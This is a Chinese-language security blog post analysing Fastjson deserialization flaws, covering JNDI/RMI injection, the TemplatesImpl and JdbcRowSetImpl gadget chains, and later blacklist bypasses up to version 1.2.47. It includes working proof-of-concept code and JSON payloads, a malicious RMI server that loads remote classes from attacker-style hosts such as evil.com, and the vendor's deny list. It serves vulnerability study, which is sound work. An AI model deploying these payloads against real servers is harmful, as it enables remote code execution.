---
title: "Fastjson jdbcRowSetImpl链及后续漏洞分析"
onlyTitle: true
date: 2023-2-06 13:05:36
categories:
- java
- 框架漏洞
tags:
- fastjson
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B89.jpg

---



# Fastjson jdbcRowSetImpl链及后续漏洞分析

在jdbcRowSetImpl中会用到jndi和rmi的知识

具体请见：https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA

素十八大佬对RMI流程的源码进行了深入分析：https://su18.org/post/rmi-attack/

本文源码分析均可跳过

## RMI

​	拥有远程方法的类必须实现Remote接口，且该类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，可以调用UnicastRemoteObject.exportObject()手工初始化，比如：

```java
public class HelloImpl implements IHello {
    protected HelloImpl() throws RemoteException {
        UnicastRemoteObject.exportObject(this, 0);
    }

    @Override
    public String sayHello(String name) {
        System.out.println(name);
        return name;
    }
}
```

其中 继承了Remote类的IHello接口 是客户端和服务端共用的接口。因为客户端指定调用的远程方法，它的全限定名必须和服务器上的完全相同

* RMI通信过程：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210154646704.png)

其中存根stub是客户端的代理，骨架skeleton是服务器代理

1. 创建远程对象。`ServiceImpl service = new ServiceImpl();`

2. 注册远程对象。`Naming.bind("rmi:127.0.0.1:1099/service",service);`(service为ServiceImpl定义的远程对象)

3. 客户端访问服务器并查找远程对象。包括两个步骤：

   ①用interface定义要查找的远程对象，在第四步作为引用：`ServiceInterface service = (ServiceInterface);`

   ②查找远程对象。`Naming.lookup("rmi://127.0.0.1:1099/service")`

4. Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub

5. 调用远程方法。比如`String rep = service.cxk("ctrl");`

6. 客户端存根和服务器骨架通信

7. 骨架代理调用`service.cxk("ctrl");`，实际上是在Server端调用的

8. 骨架把结果返回给存根

9. 存根把结果返回给客户端

其中存根stub在客户端，skeleton是服务端本身的远程对象(service本尊)



注册远程对象一般是：

```java
IHello rhello = new HelloImpl();
LocateRegistry.createRegistry(1099);
Naming.bind("rmi://x.x.x.x:1099/hello",rhello);
```

然后客户端利用`LocateRegistry.getRegistry()`本地创建Stub作为Registry远程对象的代理。然后利用lookup根据名称查找某个远程对象，来获取该远程对象的Stub：

```java
Registry registry = LocateRegistry.getRegistry("kingx_kali_host",1099);
IHello rhello = (IHello) registry.lookup("hello");
rhello.sayHello("test");
```

### 动态类加载

在本地找不到类时，会从远程URL去下载。比如服务端返回的对象是一些子类的对象实例，但是客户端上并没有其子类的class文件，如果客户端要用到这些子类中的方法，则需要允许其动态加载其他类的能力。

所以客户端使用了Registry的机制，RMIServer把url传递给客户端，客户端通过HTTP下载类。

## JNDI

JNDI用来定位资源。JNDI每个对象都有唯一的名字与其对应，可以通过名字检索对象

JNDI接口初始化时，可以将RMI URL作为参数，JNDI注入漏洞出现在客户端的lookup()函数。

如下用JNDI进行lookup：

```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
//RegistryContextFactory 是RMI Registry Service Provider对应的Factory
env.put(Context.PROVIDER_URL, "rmi://www.0kai0.cn:8080");
Context ctx = new InitialContext(env);
Object local_obj = ctx.lookup("rmi://www.0kai0.cn:8080/test");
```

其中InitialContext类作为JNDI命名服务的入口点，该类实现了Context接口。InitialContext构造函数需要为Hashtable或者其子类。初始化时要指定上下文环境，通常是JNDI工厂和JNDI的url和端口。比如这里是RMI服务，就指定RMI的工厂和url

该种初始化方式利用了哈希表，其实也可以直接设置value值：

```java
System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        System.setProperty(Context.PROVIDER_URL, "rmi://www.0kai0.cn:8080");
InitialContext ctx = new InitialContext();
```

* JNDI提供的服务：

  Java Naming 命名服务。进行命名，也就是键值对的绑定

  Java Directory 目录服务。目录服务的对象可以有属性，在目录服务中可以根据属性检索对象

  ObjectFactory 对象工厂。将Naming Service（如RMI）中存储的数据转化为Java中可表达的数据。

  JNDI注入就是远程下载自定义的ObjectFactory类

在JNDI中提供了bind绑定和lookup检索对象。lookup通过名字进行检索

>RMI绑定的对象和JNDI绑定对象的区别
>
>1.纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口。JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中
>
>2.纯RMI实现中是调用java.rmi包内的lookup()方法来检索。JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索



### Reference类

Reference类表示对存在于Naming/Directory之外的对象引用

对象可以通过Reference存储在Naming或者Directory服务下。有师傅可能会问，javax.naming.InitialContext.bind()不就是绑定对象了吗，但是RMI绑定的对象为本地远程对象（在本地项目文件内），Reference可以远程加载类(file/ftp/http等协议)，并且实例化

> java中的对象分本地对象和远程对象，本地对象默认可信任。远程对象根据安全管理器划分到不同的域，而拥有不同的权限
>
> 不过JNDI有两种安全控制方式，对JNDI SPI层，RMI\LDAP\CORBA的控制方式不同
>
> |       | 远程加载类权限                                            | 安全管理器强制实施 |
> | :---: | --------------------------------------------------------- | ------------------ |
> |  RMI  | java.rmi.server.userCodebaseOnly=false(JDK>7u21=true)     | Always             |
> | LDAP  | com.sun.jndi.ldap.object.trustURLCodebase=true(默认flase) | 非强制             |
> | CORBA |                                                           | always             |
>
> 

### JNDI协议动态转换

有的时候你指定了RMI服务，但是在使用的时候用到LDAP服务的绑定对象。可以直接指定协议，在lookup()、search()会访问LDAP服务的对象而非RMI（那设置工厂有什么意义？其实设置工厂是为了bind()对象到RMI服务，至于search、lookup这种工作不局限于RMI，所以就动态转换了。

```java
ctx.lookup("ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com");
```

在lookup()的源码也可以看到，getURLOrDefaultInitCtx()尝试获取对应协议的上下文环境



## JNDI注入

### 利用JNDI References进行注入（RMI）

RMI Server除了可以直接绑定远程对象外（先new后bind），还能通过`References`类来直接绑定外部远程对象。

当绑定在RMI注册表中的Reference，指向恶意远程class文件。并且JNDI客户端lookup()参数可控（或者Reference指定远程类参数可控），能实现RCE

> 攻击原理：
>
> 1. 攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 `rmi://evil.com:1099/refObj`；
> 2. 原先配置好的上下文环境 `rmi://localhost:1099` 会因为动态环境转换而被指向 `rmi://evil.com:1099/`；
> 3. 应用去 `rmi://evil.com:1099` 请求绑定对象 `refObj`，攻击者事先准备好的 RMI 服务会返回与名称 `refObj`想绑定的 ReferenceWrapper 对象（`Reference("EvilObject", "EvilObject", "http://evil-cb.com/")`）；
> 4. 应用获取到 `ReferenceWrapper` 对象开始从本地 `CLASSPATH` 中搜索 `EvilObject` 类，如果不存在则会从 `http://evil-cb.com/` 上去尝试获取 `EvilObject.class`，即动态的去获取 `http://evil-cb.com/EvilObject.class`；
> 5. 攻击者事先准备好的服务返回编译好的包含恶意代码的 `EvilObject.class`；
> 6. 应用开始调用 `EvilObject` 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；

* 示例：

JNDIClient：

```java
public class JNDIClient {
    public static void main(String[] args) throws Exception {
        Context ctx = new InitialContext();
        ctx.lookup(rmi://127.0.0.1:1099/refObj);
    }
}
```

RMIServer：

RMI绑定的远程对象需要继承UnicastRemoteObject类并实现Remote接口，ReferenceWrapper类就符合条件。用ReferenceWrapper对Reference进行封装。

```java
public class RMIService {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);//Registry写在server里
        Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj", refObjWrapper);
    }
}
```

其中Reference构造函数的第一个参数是在本地查找EvilObject类，如果没有，就从`http://127.0.0.1:8080/`搜索第二个参数名的EvilObject类

```java
Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
```

#### 服务端Reference classFactoryLocation可控

在Reference构造函数中的第三个参数，远程加载类的URL地址，称为classFactoryLocation。

```java
Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
```

因为在服务端，所以这种情况很少见。

如下Server：

```java
public class BServer {
    public static void main(String args[]) throws Exception {
        String uri = args[0];
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilClass", "EvilClassFactory", uri);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("demo", refObjWrapper);
    }
}
```

可以看到uri可控，当指向攻击者自己的web服务器，攻击者将EvilClassFactory恶意类放到自己的web服务器下 uri路径。RMI客户端通过JNDI查询绑定的类时，会远程加载恶意类造成命令执行

#### 客户端lookup参数可控

如JNDI客户端lookup()接收外部可控参数：

```java
public class JNDIClient {
    public static void main(String[] args) throws Exception {
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        String uri = args[0];
        Context ctx = new InitialContext(env);
        ctx.lookup(uri);
    }
}
```

攻击者可以传入恶意URI地址指向攻击者的RMIRegistry，构造恶意RMIServer，自然也能构造RMI注册表的恶意类。比如攻击者搭建的恶意AServer（图方便注册表和server一起写）

```java
public class AServer {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1688);
        Reference refObj = new Reference("EvilClass", "EvilClassFactory", "test");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'");
        registry.bind("exp", refObjWrapper);
    }
}
```

在服务端写恶意EvilClass，或者URL目录下(test/)写恶意EvilClassFactory都能造成远程代码执行。

此时向lookup传指向恶意Server的参数：rmi://127.0.0.1:1688/exp

**小细节**：当使用lookup指定rmi服务来搜寻类时，搜寻到的类需要满足远程类的要求：继承UnicastRemoteObject并实现Remote接口

造成该漏洞需要 能实现动态转换uri的InitialContext.lookup()

RMI调用了该函数的类有：

```java
org.springframework.transaction.jta.JtaTransactionManager.readObject()
com.sun.rowset.JdbcRowSetImpl.execute()
javax.management.remote.rmi.RMIConnector.connect()
org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)
```

LDAP调用了该函数的类有：

```xml
InitialDirContext.lookup()
Spring's LdapTemplate.lookup()
LdapTemplate.lookupContext()
```



在反序列化漏洞的利用过程中，也可以在readObject寻找可被外部控制的lookup()方法，来触发反序列化漏洞



### 利用JNDI References进行注入（LDAP）

JNDI对接LDAP服务时，除了lookup时指定LDAP地址：`ldap://xxx`外没什么区别。但是由于上面提到的安全管理器，LDAP不受`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制，加上新加入了`com.sun.jndi.ldap.object.trustURLCodebase`，所以利用版本不同。

这里总结一张JNDI注入对版本要求的表：

| JNDI服务   | 需要的安全属性值                                | version                                 | 备注                                    |
| ---------- | ----------------------------------------------- | --------------------------------------- | --------------------------------------- |
| RMI        | java.rmi.server.useCodebaseOnly==false          | jdk>=6u45、7u21 true                    | true时禁用自动远程加载类                |
| RMI、CORBA | com.sun.jndi.rmi.object.trustURLCodebase==true  | jdk>=6u141、7u131、8u121 false          | flase禁止通过RMI和CORBA使用远程codebase |
| LDAP       | com.sun.jndi.ldap.object.trustURLCodebase==true | jdk>=8u191、7u201、6u211 、11.0.1 false | false禁止通过LDAP协议使用远程codebase   |



## JNDI lookup()解析



`java.naming.InitialContext.java#lookup()`：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215185303011.png)

持续跟进lookup到`com.sun.jndi.rmi.registry.RegistryContext.class`，lookup：lookup获取RMI服务器上的对象引用，赋值给var2(拷贝对象到注册表)

```java
var2 = this.registry.lookup(var1.get(0));
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215191945111.png)

随后执行decodeObject:

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215192036957.png)

decodeObject会判断RMIServer绑定的类是否为RemoteReference的子类(var1)，是的话用getReference()获取Reference类，赋值给var3

随后执行NamingManager.getObjectInstance()，在此函数内执行了getObjectFactoryReference

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193329571.png)

跟进getObjectFactoryReference():可以看到第一个try并没有用到codebase，意味着首先是在本地寻找类，如果没有才执行第二个try加载codebase上的远程类。最后用newInstance()实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193544410.png)

`clas=helper.loadClass(factoryName)`采用反射的方式获取类名。在if判断里根据Reference的ClassName和codebase(如`rmi://ip:port/`)来加载factory类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215200931098.png)



## Fastjson前置知识

### Fastjson使用

pom.xml添加fastjson依赖，jdbcRowSetImpl链需要fastjson<=1.2.24

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
```

可以利用`JSON.toJSONString()`将对象**序列化**为json字符串。

反序列化：`JSON.parseObject()`、`JSON.parse`

parseObject()返回fastjson.JSONObject类，而parse返回类User

在parseObject构造函数指定为Object类，可以起到parse的作用

```java
String jsons = "{\"@type\":\"fastjsonvul.User\",\"name\":\"godown\"}";
Object user = JSON.parseObject(jsons,Object.class);
```

* `@type`参数指定反序列化后的类名，然后自动调用该类的setter、getter以及构造函数

> 如果不知道getter,setter，可以看一下javaBean:https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680



测试：

恶意类Evil：

```java
public class Evil {
    String cmd;

    public Evil(){

    }

    public void setCmd(String cmd) throws Exception{
        this.cmd = cmd;
        Runtime.getRuntime().exec(this.cmd);
    }

    public String getCmd(){
        return this.cmd;
    }

    @Override
    public String toString() {
        return "Evil{" +
                "cmd='" + cmd + '\'' +
                '}';
    }
}
```

server:

springboot起的服务器，记得导入依赖：

```xml
<parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.1.3.RELEASE</version>
</parent>
<dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
</dependency>
```

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class FastVuln1 {

    @RequestMapping("/fast1")
    public String FastVuln1(@RequestParam(name="user") String user) throws Exception{
        Object obj = JSON.parseObject(user,Object.class, Feature.SupportNonPublicField);
        System.out.println(obj.getClass().getName());
        return user;
    }
}
```

`@RestController`的意思就是controller里面的方法都以json格式输出

`@RequestMapping`注解在FastVuln1方法处，表示映射类到url路径fast1，能处理所有HTTP请求

`@RequestParam`注解在String cmd参数处，表示接收URL中的cmd参数，接收不到会报错

> 注解：https://www.cnblogs.com/tomingto/p/11377138.html



向url：`http://localhost:xxx/fast1` POST传参 payload：`user = {"@type":"org.example.Evil","cmd":"calc"}`

> 我用get方式传参出现了错误，会报`The valid characters are defined in RFC 7230 and RFC 3986`异常，url中不允许包含@或者一些其他的特殊字符
>
> fastJson默认不反序列化私有属性，parseObject加上`Feature.SuppertNonPublicField`对私有属性进行反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221216225418882.png)



### getter、setter 源码分析

在javaBeanInfo#build()方法，利用反射将 反序列化后`@type`指定类 的方法、属性、构造器存入buildClass,declaredFields数组和method数组

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217191753814.png)

buile()方法里面还有if 判断构造函数是否存在&&传入类是否为抽象类或者接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217192135930.png)

下面看对method的判断（也就是setter的定义)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217193903768.png)

方法名开头是否为set

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194023133.png)

1. 方法名长度不能小于4
2. 不能是静态方法
3. 返回的类型必须是void 或者是自己本身
4. 传入参数个数必须为1
5. 方法开头必须是set



在if(methodName.startWith("set"))内，charAt(3)返回method第四个字符，根据ascii码进行截断

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194849987.png)

如果经过截断还是找不到属性或者为Boolean，就在截断后的变量前加is，然后对相应字符大写进行拼接，然后重新寻找属性

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195212008.png)

最后将相应属性方法等内容添加到fieldInfo

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195452522.png)

getter的判断也差不多，直接给出要求：

1. 方法名长度不小于4
2. 不能是静态方法
3. 方法名要get开头同时第四个字符串要大写
4. 方法返回的类型必须继承自Collection Map AtomicBoolean AtomicInteger AtomicLong
5. 传入的参数个数需要为0



## fastJson TemplatesImpl链

版本：fastjson 1.2.22-1.2.24

TemplatesImpl链构造的恶意类为Object，但是在fastJson序列化中，只有两种方式能接收Object类（并且要设置Feature.SupportNonPublicField，恢复private属性）,但是在1.2.22才出现该属性，1.2.24后又加了很多黑名单和白名单

我们构造的PoC中有private的成员变量`_bytecodes`和`_name`

```java
1. parseObject(input,Object.class,Feature.SupportNonPublicField)//不设置Object会返回JSONObject
2. parse(input,Feature.SupportNonPublicField)
```

TemplatesImpl链有两种，一种是newTransformer()作为入口；一种是getOutputProperties()作为入口，这里用到的是第二种

```css
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()-> TransletClassLoader#defineClass()
```



POC如下：

```java
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;

import java.util.Base64;

public class fastjsonpoc1 {
    public static String generateEvil() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clas = pool.makeClass("Evil");
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        String cmd = "Runtime.getRuntime().exec(\"calc\");";
        clas.makeClassInitializer().insertBefore(cmd);
        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));

        clas.writeFile("./");

        byte[] bytes = clas.toBytecode();
        String EvilCode = Base64.getEncoder().encodeToString(bytes);
        System.out.println(EvilCode);
        return EvilCode;
    }
    public static void main(String[] args) throws Exception {
        final String GADGAT_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String evil = fastjsonpoc1.generateEvil();
        String PoC = "{\"@type\":\"" + GADGAT_CLASS + "\",\"_bytecodes\":[\"" + evil + "\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{ }," + "\"allowedProtocols\":\"all\"}\n";
        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);
    }
}
```

> poc1类用来构造恶意字节码。ClassPool.getDefult()获取默认类池后，创建类Evil
>
> 设置要继承的类
>
> ```java
> pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
> ```
>
> 创建一个空的类初始化器（静态构造函数）
>
> ```java
> CtConstructor constructor = test.makeClassInitializer();
> ```
>
> 向构造函数里加入cmd，也就是exec函数
>
> ```java
> constructor.insertBefore(cmd);
> ```
>
> 设置加载AbstractTranslet类的搜索路径
>
> ```java
> clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName())
> ```
>
> 将编译的类创建为`.class` 文件
>
> ```java
> test.writeFile("./");
> ```

- TemplatesImpl加载的字节码必须为AbstractTranslet子类，因为defineTransletClasses里会对传入类进行一次判断

```java
    for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i]);
    final Class superClass = _class[i].getSuperclass();

    // Check if this is the main class
    // ABSTRACT_TRANSLET指com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
        _transletIndex = i;
    }
    else {
        _auxClasses.put(_class[i].getName(), _class[i]);
    }
```

构造好的Evil类转为字节码后base64就能传入`_bytecodes[]`了

> String PoC经过JSON.parseObject序列化后约为(因为设置不了私有属性的缘故，这里定义了一个setFieldValue方法模拟)：

> ```java
> public class Poc {
>      public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
>         Field field = obj.getClass().getDeclaredField(fieldName);
>         field.setAccessible(true);
>         field.set(obj, value);
>     }
> ​
>     public static void main(String[] args) throws Exception {
>         TemplatesImpl obj = new TemplatesImpl();
>         setFieldValue(obj, "_bytecodes", new byte[][] {evil});//evil为恶意字节码
>         setFieldValue(obj, "_name", "a.b");
>         setFieldValue(obj, "_tfactory", {});//
> 		setFieldValue(obj,"_outputProperties",{});
>     }
> }
> ```
>



`_tfactory`也可以传入new TransformerFactoryImpl()，_tyfactory为空的话会根据类属性自动创建TransformerFactoryImpl实例，但是只有用fastjson/serializer进行序列化的时候可以不传入

因为有去除下划线的操作，属性都能加上`_`。指定了allowedProtocols=all，也就是序列化支持的协议

弹计算器图：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217222126890.png)

关于fastjson反序列化调用javaBean的setter、getter、构造函数请看http://wjlshare.com/archives/1512（不过我不看

* 源码大致原理:

json序列化入口：JSON.parseObject(),转到DefaultJSONParser.parseObject(),该方法下的一个if判断，key==`JSON.DEFAULT_TYPE_KEY` 同时 没有开启`Feature.DisableSpecialKeyDetect` 就会进入判断，利用loadClass，加载类对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204845168.png)

ParserConfig.getDeserializer()经过一系列的判断，由于TemplatesImpl类都不在if判断的条件范围内，所以会创建一个`JavaBeanDeserializer`。都获取到了对应的反序列化器之后，正式开始进行反序列化。

`JavaBeanDeserializer.parseField()` 方法中利用smartMatch对我们传入的属性进行了模糊匹配

然后调用`getFieldDeserializer`，在`sortedFieldDeserializers` 中找到`getOutputProperties` 方法，并且进行返回

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204300688.png)

然后调用反射触发getOutputProperties,进而转到TemplatesImpl链



#### fastjson1.2.24修复

在DefaultJSONParser.parseObject中将加载类的`TypeUtils.loadClass`方法替换为了`this.config.checkAutoType()`方法。并在此方法增加了白名单+黑名单，以下类传入parseObject都会被禁

```css
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

## fastjson jdbcRowSetImpl链

版本：fastjson<=1.2.24

刚才讲的fastJson TemplatesImpl链需要设置Feature.SupportNonPublicField。条件太过苛刻。



POC：

```java
import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;
import fastjsonvuln.User;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;

public class FJPoC {
    public static void main(String[] args) throws Exception {
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/refObj\", \"autoCommit\":true}";
        JSON.parse(PoC);
    }
}
```



RMI Server：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("whatever", "EvilObject", "http://127.0.0.1:8000/");
        System.out.println(refObj);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj", refObjWrapper);
    }
}
```

恶意类Evil:

```java
import java.io.IOException;

public class EvilObject {
    public EvilObject() {
    }
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

* 源码大致分析：

反序列化入口也就是JSON.parse()

自动调用@type指定类的setter，这里指定的类为`com.sun.rowset.JdbcRowSetImpl`，在该类下有setAutoCommit()方法：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151427760.png)

setAutoCommit方法调用了connect函数，在connect函数中，可以看到jndi的初始化`InitialContext()`，然后`lookup(this.getDataSourceName())`。如果这里的dataSource是可控的（这里可以直接设置dataSourceName），就能触发jndi注入

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151835059.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220152215928.png)



> 1.TemplatesImpl 链 
>
> * 优点：当fastjson不出网的时候可以直接进行盲打（配合时延的命令来判断命令是否执行成功） 
> * 缺点：版本限制  1.2.22 起才有 SupportNonPublicField 特性，并且后端开发需要特定语句才能够触发，在使用parseObject  的时候，必须要使用 JSON.parseObject(input, Object.class,  Feature.SupportNonPublicField) 
>
> 2.JdbcRowSetImpl 链 
>
> * 优点：利用范围更广，触发更为容易 
> * 缺点：当fastjson  不出网的话这个方法基本上不行（在实际过程中遇到了很多不出网的情况）同时高版本jdk中codebase默认为true，这样意味着，我们只能加载受信任的地址



## fastjson后续修复
1. 自从1.2.25 起 autotype 默认关闭
2. 增加 checkAutoType 方法，在该方法中扩充黑名单，同时增加白名单机制

黑名单扩充了：

```java
"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework"
```

* 1.2.25-1.2.41 poc

由于autotype默认关闭，在poc之前开启autotype:

```javascript
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

在新增的checkAutoType，指向的TypeUtils.loadClass()方法对传入类进行了过滤，开头为`[](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220172914052.png)

poc：`{\"@type\":\"[](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173631690.png)

将方法hash后与denyHashCodes（黑名单hash表）对比

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png)

看起来修复了，其实加密hash所用的算法能通过源码看到：

将类添加至字典addDeny:  可以看到使用的加密方法为`TypeUtils.fnv1a_64()`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174430002.png)

fnv1a_64():

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174614320.png)

github项目，用hash碰撞求出黑名单hash对应的类：https://github.com/LeadroyaL/fastjson-blacklist。结果发现，，并没有JdbcRowSetImpl

poc也只用加双写`L ;`

```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://127.0.0.1:1099/refObj", "autoCommit":true}
```

1.2.43修复：对双写进行了过滤

1.2.45修复：扩充黑名单



## fastjson1.2.25-1.2.47通杀

POC：

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://localhost:1099/refObj",
        "autoCommit":true
    }
}
```

该poc无视checkAutoType，还记得checkAutoType里将方法hash与黑名单hash对比吗，&&后面还加入了`getClassFromMapping()==null`判断

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png)

* 源码分析：

DefaultJSONParser#parser中调用了MiscCodec#deserialze方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220192354318.png)在MiscCodec中对类进行了判断，如果为java.lang.Class类，会调用TypeUtils#loadClass来加载恶意类，所以传入类需要为java.lang.Class

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220190026560.png)



在不传入java.lang.Class的loadClass:

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194431803.png)

可以看到cache值为false



在MiscCodec中调用的loadClass并未传入cache值，而该值默认true。所以顺利进入if(cache)判断里，将(className,clazz) put进mappings。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194803616.png)

这个时候回到最开始的`getClassFromMapping()==null`，返回false，就绕过了黑名单检测



1.2.48修复：将cache默认设置为false






参考：http://wjlshare.com/archives/1526

https://kingx.me/Exploit-Java-Deserialization-with-RMI.html

https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/